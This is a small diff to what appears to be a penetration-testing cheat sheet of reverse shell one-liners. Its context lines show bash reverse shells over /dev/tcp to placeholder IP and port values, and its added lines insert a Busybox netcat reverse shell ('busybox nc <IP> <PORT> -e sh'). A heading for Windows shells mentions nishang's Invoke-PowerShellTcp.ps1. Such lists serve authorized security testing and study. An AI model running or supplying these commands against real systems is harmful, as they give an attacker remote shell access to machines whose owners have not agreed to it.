@@ -317,6 +317,10 @@ bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
 
 # Wrapped Bash Shell
 bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"
+
+# Busybox
+busybox nc <IP> <PORT> -e sh
+
 ```
 ### Windows Shells
 Added to the bottom of nishangs Invoke-PowerShellTcp.ps1 file
